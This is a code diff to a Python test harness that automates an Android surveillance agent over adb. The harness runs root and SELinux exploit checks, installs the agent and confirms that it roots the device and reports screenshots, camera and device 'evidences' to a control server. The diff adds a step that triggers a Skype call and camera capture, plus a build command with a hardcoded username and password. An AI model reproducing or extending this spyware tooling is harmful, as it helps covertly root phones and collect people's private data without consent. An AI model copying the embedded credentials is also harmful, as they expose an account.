@@ -8,17 +8,20 @@ import traceback
 import collections
 import datetime
 import adb
+import argparse
 import commands
 
 import package
 from AVCommon import build_common as build
 
-#apk_template = "build/android/install.%s.apk"
-apk_template = "assets/installer.%s.apk"
+# apk_template = "build/android/install.%s.apk"
+apk_template = "assets/autotest.%s.apk"
 service = 'com.android.dvci'
+
 
 def say(text):
     os.system("say " + text)
+
 
 def check_exploit(dev, results):
     for f in ["expl_check", "local_exploit", "selinux_check", "selinux_exploit", "check.sh"]:
@@ -35,13 +38,13 @@ def check_exploit(dev, results):
         print "Testing SELINUX: ", ret_selinux
         results["exploit_selinux"] = "root" in ret_selinux
 
-    #check root
+    # check root
     ret_su = adb.execute("su -c id", dev)
     print "Has SU: ", ret_su
-    results["su"] =  ret_su
+    results["su"] = ret_su
+
 
 def check_install(dev, results, factory=None):
-
     adb.execute("ddf ru", dev)
     # uninstall device
     adb.uninstall(service, dev)
@@ -50,7 +53,7 @@ def check_install(dev, results, factory=None):
         apk = apk_template % "v2"
     else:
         apk = apk_template % "default"
-    #apk = apk_template % "default"
+    # apk = apk_template % "default"
 
     #print "... building %s" % apk
 
@@ -70,6 +73,7 @@ def check_install(dev, results, factory=None):
     results["installed"] = True
     print "installation: OK"
     return True
+
 
 def check_instances(c, device_id, operation_id):
     instances = c.instances_by_deviceid(device_id, operation_id)
@@ -123,7 +127,7 @@ def connect(c):
     assert c
     if not c.logged_in():
         return False
-        #print("Not logged in")
+        # print("Not logged in")
     else:
         print "logged in %s: OK" % c.host
     operation_id, group_id = c.operation(operation)
@@ -179,7 +183,7 @@ def check_root(c, instance_id, results, target_id):
     root_method = info_evidences[0]
     results['root'] = root_method
     roots = [r for r in info_evidences if 'previous' not in r]
-    #print "roots: %s " % roots
+    # print "roots: %s " % roots
     assert len(roots) == 1
     return True
 
@@ -187,21 +191,26 @@ def check_root(c, instance_id, results, target_id):
 def check_evidences(c, instance_id, results, target_id):
     time.sleep(60)
     evidences = c.evidences(target_id, instance_id)
-    device_evidences = [e['data']['content'] for e in evidences if e['type'] == 'device']
-    screenshot_evidences = [e for e in evidences if e['type'] == 'screenshot']
-    camera_evidences = [e for e in evidences if e['type'] == 'camera']
-    print "Evidences: dev %s, screen %s, cam %s" % (
-    len(device_evidences), len(screenshot_evidences), len(camera_evidences))
-    type_evidences = set()
+    kinds = {}
     for e in evidences:
-        type_evidences.add(e['type'])
-    print type_evidences
-    results['evidences'] = type_evidences
+        t = e['type']
+        if not t in kinds.keys():
+            kinds[t] = []
+
+        kinds[t].append(e)
+
+    ev = ""
+    for k in kinds.keys():
+        ev += "%s: %s\n" % (k, len(kinds[k]))
+
+    results['evidences'] = ev
+    results['evidence_types'] = kinds.keys()
 
 
 def uninstall_agent(dev, results):
-    print "... uninstall"
-    calc = [ f.split(":")[1] for f in  adb.execute("pm list packages calc").split() if f.startswith("package:") ][0]
+    say("press enter to uninstall")
+    input("... PRESS ENTER TO UNINSTALL")
+    calc = [f.split(":")[1] for f in adb.execute("pm list packages calc").split() if f.startswith("package:")][0]
     print "... executing calc: %s" % calc
     adb.executeMonkey(calc, dev)
     time.sleep(5)
@@ -230,13 +239,25 @@ def check_persistence(dev, results):
     results['running'] = running
 
 
+def check_skype(dev):
+    for i in range(10):
+        time.sleep(10)
+        ret = adb.executeSU("ls /data/data/com.android.dvci/files/l4")
+        print ret
+        if not 'No such file or directory' in ret:
+            break
+
+    print "Skype call and sleep"
+    adb.skype_call(dev)
+    time.sleep(60)
+
+    adb.execute("am start -a android.media.action.IMAGE_CAPTURE")
+    time.sleep(60)
+
+
 def test_device(device_id, dev, results):
-
     # check manually exploits
-    #check_exploit(dev, results)
-
-    # install agent and check it's running
-
+    # check_exploit(dev, results)
 
     # connect
     with build.connection() as c:
@@ -251,6 +272,7 @@ def test_device(device_id, dev, results):
         #factory = "540468ffaef1de2997000fb6"
         instances = check_instances(c, device_id, operation_id)
 
+        # install agent and check it's running
         if not check_install(dev, results):
             return "installation failed"
 
@@ -266,6 +288,9 @@ def test_device(device_id, dev, results):
         # check for root
         check_root(c, instance_id, results, target_id)
 
+        #skype call
+        check_skype(c)
+
         # evidences
         check_evidences(c, instance_id, results, target_id)
 
@@ -277,14 +302,16 @@ def test_device(device_id, dev, results):
 
     return True
 
+
 def set_time(dev):
     t = time.localtime()
-    adb.execute('date -s %04d%02d%02d.%02d%02d%02d' %(t.tm_year,t.tm_mon,t.tm_mday,t.tm_hour,t.tm_min,t.tm_sec))
+    adb.execute('date -s %04d%02d%02d.%02d%02d%02d' % (t.tm_year, t.tm_mon, t.tm_mday, t.tm_hour, t.tm_min, t.tm_sec))
 
-def do_test(dev = None):
+
+def do_test(dev=None):
     build.connection.host = "rcs-castore"
     device_id = adb.get_deviceid(dev)
-    #print "device_id: %s" % device_id
+    # print "device_id: %s" % device_id
 
     assert device_id
     assert len(device_id) >= 8
@@ -323,6 +350,40 @@ def do_test(dev = None):
 
     return results
 
+
+def print_if_exists(results, param):
+    for p in param:
+        print "\t%s: %s" % (p, results.get(p, ""))
+
+
+def report_test_rail(results):
+    print "Installation"
+    print_if_exists(results, ["time", "installed", "executed", "instance_name", "info", "error", ])
+    print "Device"
+    print_if_exists(results, ["device", "id", "release", "build_date"])
+    print "Root"
+    print_if_exists(results, ["root", "selinux"])
+    print "Evidences"
+    print_if_exists(results, ["evidences"])
+    print "Uninstall"
+    print_if_exists(results, ["uninstall", "running"])
+
+
+def parse_args():
+    parser = argparse.ArgumentParser(description='AVMonitor master.')
+    parser.add_argument('-b', '--build', required=False, action='store_true',
+                        help="Rebuild apk")
+    args = parser.parse_args()
+    if args.build or not os.path.exists('assets/autotest.default.apk'):
+        os.system(
+            'ruby assets/rcs-core.rb -u zenobatch -p castoreP123 -d rcs-castore -f RCS_0000002050 -b build.and.json -o and.zip')
+        os.system('unzip and.zip -d assets -o')
+        os.remove('and.zip')
+    if not os.path.exists('assets/autotest.default.apk'):
+        print "ERROR, cannot build apk"
+        exit(0)
+
+
 def main():
     devices = adb.get_attached_devices()
 
@@ -332,6 +393,8 @@ def main():
     3) connesso wifi a RSSM
     4) screen time 10m (settings/display/sleep)
     """
+
+    parse_args()
 
     print "devices connessi:"
     for device in devices:
@@ -347,6 +410,7 @@ def main():
             print "eseguo il test su %s" % dev
 
         results = do_test(dev)
+        report_test_rail(results)
 
         with open('report/hardware.logs.txt', 'a+') as logfile:
             logfile.write(str(results))
@@ -356,6 +420,7 @@ def main():
             logfile.write("\n")
     print "Fine."
     say("test ended")
+
 
 if __name__ == "__main__":
     main()
